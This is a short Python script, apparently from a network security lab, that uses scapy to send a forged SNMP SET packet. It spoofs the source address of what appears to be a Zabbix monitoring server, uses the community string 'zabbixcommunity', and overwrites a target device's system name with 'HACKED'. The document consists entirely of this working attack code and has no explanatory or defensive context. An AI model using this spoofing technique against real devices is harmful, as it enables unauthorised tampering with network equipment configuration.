from scapy.sendrecv import send
from scapy.layers.snmp import SNMP, SNMPvarbind, SNMPset, SNMPget
from scapy.layers.inet import IP, UDP
from scapy.asn1.asn1 import ASN1_OID, ASN1_STRING

server_ip = "10.0.4.2"
target_ip = "10.0.3.3" # Adres IP zmienniany w zależności od adresu urządzenia do którego ma zostać wysłane żądanie SNMP SET

target_community = "zabbixcommunity"

target_oid = '1.3.6.1.2.1.1.5.0'
value_set = "HACKED"

varbind=SNMPvarbind(oid=ASN1_OID(target_oid), value=ASN1_STRING(value_set))

snmp_packet = IP(src=server_ip, dst=target_ip) / UDP(dport=161) / SNMP(
    community=target_community,
    PDU=SNMPset(varbindlist=[varbind])
)

send(snmp_packet)

print("Send done")